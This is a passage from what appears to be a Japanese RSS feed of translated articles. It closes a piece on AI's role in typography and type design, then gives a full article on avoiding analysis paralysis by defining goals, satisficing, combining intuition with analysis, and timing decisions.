<p>ベクターグラフィックスやタイポグラフィの生成におけるAIの可能性はまだ初期段階にあるものの、現在の動向は有望な未来を示すものであり、複雑性の問題は徐々に克服されていき、デザイナーに新たな道を開くでしょう。</p>
<h2>未来を導く：AIタイポグラフィにおけるデザイナーの重要な役割</h2>
<p>こうした流れや、高らかにうたわれているAIの可能性を受けて、クリエイティブ領域のプロフェッショナルは当然のことながらその短期的影響について検討しています。AIを活用する愛好家が増えるにつれ、タイポグラフィを含む専門テクノロジーが軽視されるようになるのではないかと、デザイナーは懸念を募らせています。</p>
<blockquote>
<p><a class="pull-quote__link" aria-label="Share on Twitter" href="https://twitter.com/share?text=%0aTo%20preserve%20our%20creative%20integrity%20and%20professional%20effectiveness,%20it%e2%80%99s%20crucial%20for%20designers%20to%20influence%20the%20development%20of%20AI%20tools%20and%20insist%20on%20high%20design%20standards%20to%20positively%20shape%20the%20future%20of%20our%20industry.%0a&amp;url=https://smashingmagazine.com%2f2024%2f01%2fai-dilemma-graphic-design-typography%2f">クリエイターとしての本来の姿とプロフェッショナルとしての立場を守るため、デザイナーがAIツールの発展に影響を及ぼし、高いデザイン基準を主張することは、我々の業界の未来を良い方向に導く上で極めて重要です。</a></p>
</blockquote>
<p>（訳注：原文同様 XへのPOSTリンクとなっています）</p>
<p>グーテンベルクの印刷機も、当初は懸念や論争を引き起こしたものの、史上最も革命的な発明の一つになりました。AIも同様の可能性を秘めていますが、それがどのような道筋をたどのるかは我々のアプローチにかかっています。</p>
<h2>デザイナーのジレンマ：品質を保ちつつAIを受け入れる</h2>
<p>人工知能を利用して創造性を高め、効率化を図るのか、それとも素人主導の自動化がプロの仕事の質の低下を招くリスクを黙って見過ごすのか、我々は選択を迫られています。受け身の姿勢で傍観者になるのではなく、AIの発展が品質主導の結果につながり、これらのツールがデザイナーとしての我々の力を弱めるのではなく、強化するよう積極的に関わる必要があります。</p>
<p>デザイナーは、アイデアを構築する方法について造詣が深いため、AIツールをより効果的に使いこなせると言われています。しかし、こうした新しいツールを受け入れることは、ガードを緩め、他者が基準を設定するのを認めることとは違います。そうではなく、我々はAIをインスピレーションやイノベーションへの踏み台として利用すべきです。</p>
<p>例えば、現在のAI生成画像は分かりにくいテキストプロンプトと大量のデータセットの組み合わせにより、予期しない結果を生み出すことが少なくありません。しかし、インスピレーションを得て、新しいアイデアを生み出すきっかけとして有効なツールです。</p>
<h2>AIタイポグラフィにおいて立場を守る</h2>
<p>タイポグラフィにおいて、デザイナーは書体を選ぶ際により慎重になる必要があります。独創的で創意に富んだアマチュアフォントが市場に大量に出回り、それらの品質について掘り下げた評価が必要になる可能性があります。デザイナーは、文字セット、スペーシング、デザイン全体をより注意深く確認しなくてはいけません。</p>
<p>書体を巧みに使うことは、仕事を際立たせるだけでなく、業界のトレンドや基準に影響し、活字デザイナーのインスピレーションや指針になるという意味でも、これまで以上に重要です。</p>
<h2>活字デザインにおいてAIに適応する</h2>
<p>AIツールの発展と方向性は、テクノロジーに巨額の投資を行っている大企業の手にのみ委ねる必要はありません。タイプファウンドリー各社が協力し、互いのリソースを出し合って<strong>共通のAIソフトウェアモデル</strong>を構築できれば有効な手立てになるでしょう。こうした協力的アプローチにより、AI主導のイノベーションを利用できるだけでなく、独自のデザインを無断使用から守ることもできます。</p>
<p>また、<strong>大規模なAIモデルより小規模なものの方がパフォーマンス面で優れている場合がある</strong>ことを示す<a href="https://www.semianalysis.com/p/google-we-have-no-moat-and-neither#%C2%A7large-models-arent-more-capable-in-the-long-run-if-we-can-iterate-faster-on-small-models">研究結果</a>もあります。つまり、独立系のファウンドリーが独自のニーズに合わせた小規模なカスタムAIツールを開発することも可能ということです。</p>
<h2>デザイナーが未来を形作る：静的なタイポグラフィからAI主導のイノベーションへ</h2>
<p>品質がまちまちのアマチュアフォントが大量に出回るのは懸念材料ですが、AIはプロによる書体の品質と新規性も大幅に改善するでしょう。活字デザイナーは開発者と協力し、活字の次なる進化をリードしていく存在です。</p>
<blockquote>
<p><a class="pull-quote__link" aria-label="Share on Twitter" href="https://twitter.com/share?text=%0aWhat%20we%e2%80%99ve%20become%20used%20to%20in%20terms%20of%20typography%20is%20woefully%20static,%20lacking%20the%20ability%20to%20dynamically%20adjust%20to%20content,%20context,%20or%20reader%20interaction.%20At%20present,%20our%20options%20are%20limited%20to%20changing%20font%20styles%20and%20incorporating%20emojis.%0a&amp;url=https://smashingmagazine.com%2f2024%2f01%2fai-dilemma-graphic-design-typography%2f">私たちが見慣れたタイポグラフィはひどく静的で、コンテンツやコンテキスト、読み手の反応に応じて動的に調整することができません。現時点では、フォントスタイルを変えたり、絵文字を取り入れたりするくらいしか選択肢がありません。
</a></p>
</blockquote>
<p>（訳注：原文同様 XへのPOSTリンクとなっています）</p>
<p>過去に活躍した写字生は、強調や装飾を施したテキストを作成するテクノロジーにたけており、情報の伝達をより豊かなものにしていました。ヨハネス・グーテンベルクが印刷機を発明した際、彼の目的は写字生の芸術性を超えることではなく、知識と情報を一般大衆に届けることでした。その点について言えば、グーテンベルクは成功しました。しかし、活字はその後創造的進化を遂げたものの、テキストを視覚的により豊かにし、微妙なニュアンスを表現する写字生の能力は失われました。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/ai-dilemma-graphic-design-typography/4-illuminated-manuscript-on-vellum-vienna.jpeg">
<em>活字の発明によって失われた表現の豊かさや柔軟性を示す挿絵入り原稿。ウィーン、1430〜1435年頃。</em>（<em>画像出典：</em><a href="https://upload.wikimedia.org/wikipedia/commons/4/49/2014_CKS_01584_0011_001%28missal_use_of_udine_illuminated_manuscript_on_vellum_vienna_c1430-35%29.jpg"><em>Wikipedia</em></a>）<a href="https://files.smashing.media/articles/ai-dilemma-graphic-design-typography/4-illuminated-manuscript-on-vellum-vienna.jpeg"><em>拡大プレビュー</em></a></p>
<h2>タイポグラフィの運命</h2>
<p>タイポグラフィの次なる革命は、<a href="https://typedrawers.com/discussion/comment/64337/#Comment_64337">テキスト表現の流動性、適応性、双方向性</a>の時代を開くものであるべきでしょう。<strong>活字はもっとカスタムレタリングのように振る舞うべきです</strong>。この変化は読者体験を大幅に向上させ、文字によるコミュニケーションをより汎用的かつ正確にし、以下を含むさまざまな要素への対応を可能にします。</p>
<ul>
<li><strong>コンテンツに応じたテキストの調整</strong><br>
本のクライマックスに合わせてスタイルやリズムを変えたり、元気が出る詩を読む際に文字をおどけた調子で浮かび上がらせたりといった、表示されたコンテンツに応じたテキストの変化。</li>
<li><strong>環境への適応</strong><br>
照明や、読者の目とテキストの距離などに応じたテキストの変化。</li>
<li><strong>感情の表現</strong><br>
色の変化やかすかなアニメーションなど、テキストの感情的なトーンに応じて変化する要素を取り入れた、表現豊かなコミュニケーション。</li>
<li><strong>ユーザーインタラクション</strong><br>
生体センサーを通じて検知するユーザーの読むスピードや目の動き、感情的な反応に応じたテキストの変化。</li>
<li><strong>デバイスとプラットフォームの応答性</strong><br>
CSSを使ってあらかじめ設定する必要もなく、画面のサイズ、解像度、向きなどの要素を考慮し、テキストを適応させることで実現する最適な可読性。</li>
<li><strong>アクセシビリティの強化</strong><br>
幼い読者や、失語症や視覚障害のある読者に合わせて文字の大きさやコントラストを動的に調整するテキスト。</li>
<li><strong>言語と文化への適応</strong><br>
タイポグラフィのデザイン意図を維持し、文化的なニュアンスに敏感に適応しつつ、言語間やスクリプト間でスムーズに移行できる活字。</li>
</ul>
<h2>最後に：デザインの未来を受け入れる</h2>
<p>我々は、タイポグラフィの大変革の入り口に立っています。他の業界と同様に、活字業界もこの先大きな変化が待ち受けています。タイプマスター3000のような未来のシナリオは、業界にとってその道のりがいかに混乱に満ちたものかを示しています。しかし、静的な活字の限界を押し広げ、我々の創造力を高め、異文化コミュニケーションの向上を促すためにも、この道は進む価値のあるものです。</p>
<p>変化は近づいており、我々デザイナーにとっては変化を受け入れるだけでは不十分です。専門知識、嗜好、判断力を頼りに、積極的に変化のかじ取りをしなくてはいけません。業界一丸となってタイポグラフィへのAIの導入を導き、単なる自動化にとどまらないようにすることが重要です。AIの導入は、タイポグラフィを高めるものであるべきです。目指す先には、フォントの静的な実用性を超越した、動的かつ正確で、コンテキストに応じて変化するタイポグラフィがあります。</p>
<p>各自が創造性や知見を持ち寄り、ともにAIを導くことで、自らの創造性を高められるだけでなく、デザインの水準を引き上げ、文明全体をより豊かにすることができるはずです。</p>
<h3>関連リンク</h3>
<ul>
<li><a href="http://www.jamieclarketype.com/">Jamie Clarke氏オフィシャルサイト</a></li>
<li><a href="https://www.lttrink.com/">LTTR/INK</a></li>
</ul>]]></content:encoded></item><item><title><![CDATA[分析による思考の麻痺を脱し、自信を持って決断を下す方法]]></title><description><![CDATA[「決断の時における最善の選択は、正しいことをすること。最悪の選択は、何もしないことだ。」セオドア・ルーズベルトの言葉です。 人生を左右する可能性のある重要な決断を下すとき、結果が不確実であることや、…]]></description><link>https://postd.cc/how-to-stop-analysis-paralysis-and-make-more-confident-decisions/</link><guid isPermaLink="false">https://postd.cc/how-to-stop-analysis-paralysis-and-make-more-confident-decisions/</guid><category><![CDATA[スタートアップ]]></category><category><![CDATA[起業家精神]]></category><category><![CDATA[意思決定]]></category><category><![CDATA[クリティカルシンキング]]></category><pubDate>Fri, 26 Apr 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>「決断の時における最善の選択は、正しいことをすること。最悪の選択は、何もしないことだ。」セオドア・ルーズベルトの言葉です。</p>
<p>人生を左右する可能性のある重要な決断を下すとき、結果が不確実であることや、未知の領域に踏み込むことへの不安から、ひたすらデータを集めては分析を繰り返し、必要以上に考え過ぎてしまう非生産的な悪循環に陥ってしまうことがあります。</p>
<p>想像が膨らんでしまい、最悪のシナリオを想定してそれが最善だと思い込んでしまうこともあれば、頭の中にストーリーを描き、良い選択肢があるにもかかわらず、より良い選択肢があるのではと考えて全て却下してしまうこともあります。
<em>こうした決断の例としては、引越し、退職と起業、転職、企業戦略の大転換などがあります。</em></p>
<p>恐怖心、完璧主義、怠惰、集中すべき目標の欠如など、理由はさまざまですが、分析ばかりに時間を費やして一向に行動を起こさないでいると、「analysis paralysis（分析による思考の麻痺）」と呼ばれる一種の思考停止状態に陥ってしまいます。完璧な決断を下そうと思うあまり、決断できなくなってしまうのです。ありもしない確実性を追求し続けるため、結論が出ずもがき苦しみます。何が最善の決断で、どうすれば望む結果が得られるのかなど、誰にも分からないのです。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>考え過ぎると、分析が逆に思考を麻痺させてしまいます。考え抜くことは大事ですが、考えることを行動を起こさないことの言い訳にしている人が多いように思います。
— ロバート・ハージャベック</p></div></div>
<p>完璧な決断を下すことはできませんが、より自信を持って決断を下すことは可能です。そのために実践できる4つの方法をご紹介します。</p>
<h2>実現したい結果を明確に定義する</h2>
<p>問題の定義が曖昧だったり、実現したい結果が不明確だったりする中で決断を下そうとすると、何時間もデータと睨めっこするだけで、いつまで経っても結論が出ないということになりかねません。</p>
<p>決断を下せない原因について、問題が複雑であることや、インプットが足りないこと、データポイントが少ないことなどを挙げるかもしれませんが、これらは全て真実から目を逸らすための言い訳に過ぎません。真実とはすなわち、自分が何を望んでいるのかが分からないということです。</p>
<p>問題を明確にし、成功の基準を定義することが、決断を下すために行うべき作業の半分です。これが、決断を下して望む結果を手にするための足がかりとなります。この作業を怠ると、残り半分の作業にいくら労力を割いても徒労に終わります。</p>
<p>前半の作業を行うにあたり、以下の問いについて考えてみるとよいでしょう。</p>
<ol>
<li>解決したい問題は何か？</li>
<li>解決するべき問題は本当にこれでいいのか？</li>
<li>どのような結果を実現したいのか？自分にとって最も重要なことは何か？</li>
<li>結果を実現できたかどうかはどう確認するのか？成功基準は何か？</li>
</ol>
<p>思考の麻痺は、成功基準が達成不可能な場合にも起こります。挙げた目標を全て100%確実に実現することを期待し、一切の妥協を認めない場合などです。</p>
<p>望む結果を単に羅列しただけでは優れた成功基準とは言えません。自分にとって最も重要なことを一つ特定する必要があります。それがあなたの北極星（道しるべ）になります。道しるべが分かっていると、決断を下すのも容易になります。道しるべにたどり着けそうな、有望な選択肢を見つけるだけでいいのです。</p>
<p>問題と実現したい結果を明確に定義することで、常に目標をしっかりと見据え、意思決定プロセスを容易にすることができます。</p>
<h2>必要十分で満足する</h2>
<p>何かを決断するとき、さまざまな選択肢や異なる視点、複数の情報源を考慮するのは良いことです。そうすることで、バイアスや思い込み、その他の状況的制約によって、決断と実現する結果が制限されるのを防ぐことができます。</p>
<p>選択肢があるのは良い一方で、選択肢が多過ぎるとかえって圧倒されてしまいます。選択肢が多ければ多いほど、決断を下すのは難しくなります。情報過多と多過ぎる選択肢は決断力の低下を招くのです。</p>
<p>解決策の調査に多くの時間を費やし、それぞれの欠点にばかり注目し、最善の選択肢を見つけようとひたすら時間と労力を注ぎ込むことになりかねません。しかし、決断を下して前に進むどころか、選択肢が多過ぎると不安が膨らむばかりです。</p>
<p>選択肢が多過ぎると思考能力が奪われ、決断を先送りにしがちです。</p>
<p>選択肢が増えると満足度が下り、自分の選択に自信が持てなくなって、後で決断を後悔する可能性が高まることを示す<a href="https://www.researchgate.net/publication/265170803_Choice_Overload_A_Conceptual_Review_and_Meta-Analysis?ref=hackernoon.com">研究結果</a>もあります。</p>
<p>心理学者のバリー・シュワルツは、人間は「マキシマイザー（利益最大化人間）」と「サティスファイサー（満足化人間）」の2種類に分けることができると言います。マキシマイザーは、最大の利益をもたらす選択をしようと努力し、最高の結果のみを求め、受け入れます。全ての選択肢をよく吟味しなければ選択できないため、絶えず情報を求めては他者と比較します。一方、サティスファイサーはより控えめな基準を用いて、受け入れ可能なレベルを超える選択肢を選びます。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>「サティスファイス（満足化）」するということは、十分なレベルで満足し、より良い選択肢があるかもしれない可能性については考えないということです。」
— バリー・シュワルツ</p></div></div>
<p>思考の麻痺に陥らないために、サティスファイサーになりましょう。それには以下のことを行う必要があります。</p>
<ol>
<li>調査範囲に境界を設けましょう。無制限に調査を行うことは避けてください。収集する情報量や考慮するインプットを制限し、期限を設けましょう。</li>
<li>決断にも期限を設けましょう。危機感を持つためにも、問題の規模や複雑さを踏まえた期限を設定してください。</li>
<li>それぞれの選択肢について良い点と悪い点を挙げ、その時点で際立って優れて見えるものを選びましょう。</li>
<li>決断を下したら、より良い選択肢の可能性については考えないようにします。自分の決断について後からあれこれ悩むことはせず、決断を実行に移していきましょう。</li>
</ol>
<p>必要十分で満足するということは、平凡な選択肢を受け入れるのとは違います。十分な検討と思慮に基づいて選択を行う必要はありますが、一定の制限を設けた上で行うのであり、より良い選択肢の可能性についてくよくよ悩むのではなく、決断を行動に移すことに時間と労力を費やすということです。</p>
<h2>直感でデータを組み合わせる</h2>
<p>思考が麻痺すると、決断を前に尻込みしてしまいます。合理的な選択をしたいがために行き詰まりを感じます。それ自体は自然なことですが、問題は、知らず知らずのうちに合理性の追求から過度な分析を行うようになり、その結果、意思決定を先送りしてしまうことです。</p>
<p>合理的アプローチには、慎重な思考が求められます。脳の前頭葉を働かせ、さまざまな選択肢を考慮し、妥協点を比較した上で選択を行います。直感的思考は、感情や経験、知識を動員して行います。このような思考は非論理的でも非合理的でもなく、生涯を通じて養ってきた知性です。</p>
<p>脳はパターンを認識するようにできており、直感的思考ではあなたが現在置かれている状況を過去のパターンに照らし合わせ、それをもとに決断を下します。直感が時に正しく、時に間違っているのはそのためです。</p>
<p>判断と意思決定にまつわる心理学や行動経済学の研究で知られる心理学者および経済学者のダニエル・カーネマンは、直感の働きは次の3つの条件に基づくと言います。</p>
<ol>
<li>傾向やパターンを認識するためには、一定の規則性が求められます。直感は、目まぐるしく変化する複雑な状況下では養うことも、適用することもできません。</li>
<li>直感を信じるためには、その分野について豊富な経験と練習が必要です。それがなければ、直感を働かせて万事うまくいったとしても、それは単に運が良かっただけであり、直感がもたらした結果ではありません。</li>
<li>直感が正しかったかどうかについて、即座に具体的なフィードバックが得られます。</li>
</ol>
<p>これらのうち該当しないものがある場合、問題についてもっと合理的に考え抜いた方がいいでしょう。</p>
<p>ほとんどの人は、意思決定を行う際に分析的思考と直感的思考のいずれかを使用します。これは、両者が共存できない相反する戦略だと考えているからです。しかし、研究ではそれとは異なる事実が明らかになっています。私たちの最良の決断は、分析的思考と直感的思考のいずれかを使用するのではなく、両方を組み合わせて使用したときに生まれるのです。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>パターン照合のみに頼った純粋に直感的な戦略は、パターン照合がもたらす選択肢が間違っていることがあるため、リスクが大き過ぎます。逆に、思索のみに頼った分析的な戦略だと時間がかかり過ぎます。
— ゲーリー・クライン</p></div></div>
<p>思考の麻痺に陥ったときは、データのみに頼るのではなく、過去の知識や経験も加味して決断を下すとよいでしょう。脳の理性をつかさどる部分を使ってさまざまな選択肢を考慮し、直感も交えて最終的な決断を下しましょう。</p>
<h2>決断を下すのに適切な時間帯を選ぶ</h2>
<p>1日を通して小さな決断を何度も下すことは、それ自体さほど精神的負担を強いるものではないため、一見無害に思えるかもしれません。しかし、エネルギーを消費し続けて1日の終わりを迎える頃には、決断を下す余力が失われてきます。</p>
<p>実際に感じることができてすぐに現れる身体的疲労とは異なり、繰り返し意思決定を行ってきたことによる精神的疲労は目に見えません。</p>
<p>心理学者が意思決定疲労と呼ぶこの状態は、意思決定の質の低下を招きます。いくつもの意思決定を行った後は、折り合いをつけることを渋り、簡単な選択肢に落ち着こうとし、自制心を働かせることさえ難しく感じられるかもしれません。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>一日中難しい決断を迫られるような仕事だと、気力もいつかは底をつき、エネルギーを節約する方法を探し始めます。例えば、決断を避けたり、先送りしたりする言い訳を探すようになるでしょう。また、最も楽で安全な選択肢を探すようになるでしょう。そしてその選択肢とは、多くの場合、現状を維持することです。
— ロイ・バウマイスター</p></div></div>
<p>良い決断を下すためには、さまざまな領域の知識を動員し、異なるアイデアをつなぎ合わせ、アイデアの深さと幅広さの適切なバランスを保ち、新たなつながりを生み出し、いくつかの有望な候補に焦点を定める必要があります。</p>
<p>疲労により頭の働きが鈍ってくると、雑音と信号を聞き分けることも難しくなります。その結果、考え過ぎてしまうようになり、具体的な方向性を示すこともできないまま、いくつものアイデアを行ったり来たりするようになります。</p>
<p>意思決定疲労は、存在すらしない問題について延々と考えたり、偏った結論を導いたり、より良い選択肢の可能性にとらわれ分析による思考の麻痺状態に陥ったりする原因になり得ます。その時の状況で最良の決断を下すのではなく、完璧な解決策を追求しようとしてしまうかもしれません。</p>
<p>重要な決断について思考の麻痺に陥らないようにするため、そうした決断は、頭の情報処理能力がピークの時間帯に下すようにしましょう。気力が充実しているタイミングに合わせて精神的負担が強いられる決断を下すことで、考え過ぎてしまう悪循環に落ちる可能性を減らせるでしょう。</p>
<p>決断を下す前に、以下の問いを自問してみてください。</p>
<ol>
<li>今がこの決断を下すのにベストな時間帯か？</li>
<li>この決断を下すにあたって、ベストコンディションにあると言えるか？</li>
<li>普段に比べて周りが慌ただしく感じられるか？</li>
</ol>
<p>その決断を下すのに自分がベストの状態にある時間帯を確保し、カレンダーに書き込みましょう。そしてその時間になったら、それ以上決断を遅らせないよう自分に言い聞かせ、目標に集中しましょう。</p>
<p>初めはばからしく感じられるかもしれませんが、実際に繰り返し行うことで、考え過ぎることなく決断を下せるようになってくるはずです。</p>
<p>最後はテリー・グッドカインドの以下の言葉で終わりたいと思います。筆者が思考の麻痺に陥ったときに、いつも助けてくれる言葉です。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>「何も選択しないより、間違った選択をした方がいい場合もあります。あなたに前に進む勇気があるのであれば、それは稀有なことです。岐路に立ち、進むべき方向を選べない人は、どこにもたどり着けません。」</p></div></div>
<h2>考えることをやめ、今すぐ行動しましょう。</h2>
<h3>まとめ</h3>
<ol>
<li>重要な決断は先送りするべきではありませんが、そうしてしまいがちです。完璧な決断を下そうとすると、思考が麻痺してかえって決断を下せなくなってしまい、行動を起こして前に進むことができなくなります。</li>
<li>問題や実現したい結果を明確に定義しないことが、思考の麻痺に陥る最大の原因の一つです。なかなか決断を下せず苦しんでいる場合、問題と成功基準を明確に定義しましょう。</li>
<li>最良の選択肢のみを追求するマキシマイザーになるのではなく、サティスファイサーになり、十分満足できる選択肢を特定して心配することをやめましょう。</li>
<li>直感を無視して合理的思考に重点を置き過ぎると、思考が麻痺します。考え過ぎによる悪循環を断ち切り、積極的に行動を起こすには、直感と合理的思考を組み合わせる戦略が効果的です。</li>
<li>意思決定疲労により疲れた頭は、決断を下すことを拒むようになります。この現象に対処する方法として、気力が充実している時間帯に決断を下すようにするとよいでしょう。</li>
</ol>
<p>この記事は以前<a href="https://www.techtello.com/analysis-paralysis/?ref=hackernoon.com">こちら</a>で公開されたものです。他の記事にも興味のある方は、<a href="https://www.linkedin.com/in/sagivini/?ref=hackernoon.com">LinkedIn</a>またはこちらをぜひフォローしてください。</p>]]></content:encoded></item></channel></rss>